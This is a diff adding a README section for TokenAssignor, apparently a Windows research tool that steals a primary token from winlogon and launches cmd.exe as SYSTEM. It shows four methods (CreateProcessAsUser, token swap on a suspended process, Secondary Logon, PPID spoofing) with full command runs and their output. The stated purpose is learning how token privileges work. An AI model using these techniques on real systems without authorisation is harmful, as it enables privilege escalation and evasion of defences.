@@ -23,6 +23,7 @@ Codes in this repository are intended to help investigate how token privileges w
   - [S4uDelegator](#s4udelegator)
   - [SwitchPriv](#switchpriv)
   - [TokenDump](#tokendump)
+  - [TokenAssignor](#tokenassignor)
   - [TrustExec](#trustexec)
   - [UserRightsUtil](#userrightsutil)
   - [Reference](#reference)
@@ -1996,6 +1997,177 @@ Token Source ID     : N/A
 [*] Done.
 ```
 
+
+## TokenAssignor
+
+[Back to Top](#privfu)
+
+[Project](./TokenAssignor/)
+
+This tool is to learh how to assign primary token:
+
+```
+PS C:\Dev> .\TokenAssignor.exe
+
+TokenAssignor - Tool to execute token assigned process.
+
+Usage: TokenAssignor.exe [Options]
+
+        -h, --help    : Displays this help message.
+        -c, --command : Specifies a command to execute. Default is cmd.exe.
+        -m, --method  : Specifies a method ID (0 - 3).
+        -p, --pid     : Specifies a source PID for token stealing.
+
+[!] -m option is required.
+```
+
+This tool tries to steal token from a specified process and execute a token assigned process.
+Most of methods require administrative privileges.
+To execute a token assigned process with `CreateProcessAsUser` API, set `-m` option to `0`:
+
+```
+PS C:\Dev> Get-Process winlogon
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    270      13     2452      10108       0.33    688   1 winlogon
+
+PS C:\Dev> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== =============================================
+desktop-5ohmobj\user S-1-5-21-1955100404-698441589-1496171011-1001
+PS C:\Dev> .\TokenAssignor.exe -p 688 -m 0
+
+[+] SeDebugPrivilege is enabled successfully.
+[+] SeImpersonatePrivilege is enabled successfully.
+[+] Got a primary token from PID 688 (Handle = 0x68).
+[+] Got a impersonation token from winlogon.exe (Handle = 0x2E0).
+[+] Impersonation as winlogon.exe is successful.
+[+] "C:\Windows\system32\cmd.exe" is executed successfully (PID = 9552).
+[*] User of the created process is NT AUTHORITY\SYSTEM (SID: S-1-5-18)
+Microsoft Windows [Version 10.0.22631.2428]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Dev>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+```
+
+When set `-m` option to `1`, this tool tries to create a suspended process and update the primary token to a stolen token.
+This method cannot be used for changing Session ID due to kernel restriction.
+Kernel forces token's Session ID to be matched with Session ID for `_EPROCESS`:
+
+```
+PS C:\Dev> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== =============================================
+desktop-5ohmobj\user S-1-5-21-1955100404-698441589-1496171011-1001
+PS C:\Dev> .\TokenAssignor.exe -p 688 -m 1
+
+[+] SeDebugPrivilege is enabled successfully.
+[+] SeImpersonatePrivilege is enabled successfully.
+[+] Got a primary token from PID 688 (Handle = 0x2C8).
+[+] Got a impersonation token from winlogon.exe (Handle = 0x2D8).
+[+] Impersonation as winlogon.exe is successful.
+[+] Suspended "C:\Windows\system32\cmd.exe" is executed successfully (PID = 9968).
+[*] Current user of the suspended process is DESKTOP-5OHMOBJ\user (SID: S-1-5-21-1955100404-698441589-1496171011-1001)
+[+] Primary token for the suspended process is updated successfully.
+[*] Current user of the suspended process is NT AUTHORITY\SYSTEM (SID: S-1-5-18)
+[*] Resuming the suspended process.
+Microsoft Windows [Version 10.0.22631.2428]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Dev>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+```
+
+If set `-m` option is set to `2`, creates a new token assigned process with Secondary Logon Service:
+
+```
+PS C:\Dev> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== =============================================
+desktop-5ohmobj\user S-1-5-21-1955100404-698441589-1496171011-1001
+PS C:\Dev> .\TokenAssignor.exe -p 688 -m 2
+
+[+] SeDebugPrivilege is enabled successfully.
+[+] SeImpersonatePrivilege is enabled successfully.
+[+] Got a primary token from PID 688 (Handle = 0x2C4).
+[+] "C:\Windows\system32\cmd.exe" is executed successfully (PID = 5832).
+[*] User of the created process is NT AUTHORITY\SYSTEM (SID: S-1-5-18)
+
+PS C:\Dev>
+
+Microsoft Windows [Version 10.0.22631.2428]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Dev>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+```
+
+If set `-m` option is set to `3`, creates a new token assigned process with PPID spoofing method:
+
+```
+PS C:\Dev> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== =============================================
+desktop-5ohmobj\user S-1-5-21-1955100404-698441589-1496171011-1001
+PS C:\Dev> .\TokenAssignor.exe -p 688 -m 3
+
+[+] SeDebugPrivilege is enabled successfully.
+[+] Got a handle from PID 688 (Handle = 0x2C4).
+[+] Thread attribute is built successfully.
+[+] "C:\Windows\system32\cmd.exe" is executed successfully (PID = 4852).
+[*] User of the created process is NT AUTHORITY\SYSTEM (SID: S-1-5-18)
+
+PS C:\Dev>
+
+
+Microsoft Windows [Version 10.0.22631.2428]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Dev>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+```
 
 
 ## TrustExec
